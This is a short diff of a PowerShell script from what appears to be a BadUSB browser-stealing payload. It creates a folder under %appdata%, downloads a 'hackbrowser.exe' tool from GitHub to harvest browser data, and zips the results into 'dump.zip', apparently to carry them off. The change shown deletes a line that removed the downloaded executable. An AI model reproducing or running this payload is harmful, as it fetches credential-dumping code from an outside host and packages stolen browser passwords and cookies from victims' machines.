@@ -5,7 +5,6 @@ mkdir "$env:appdata"
 Set-Location "$env:appdata"
 #Downloading and executing hackbrowser.exe
 Invoke-WebRequest 'https://github.com/GamehunterKaan/BadUSB-Browser/raw/main/hackbrowser.exe' -OutFile "hb.exe"
-Remove-Item -Path "$env:appdata\hb.exe" -Force
 #Creating A Zip Archive
 Compress-Archive -Path * -DestinationPath dump.zip
 $Random = Get-Random
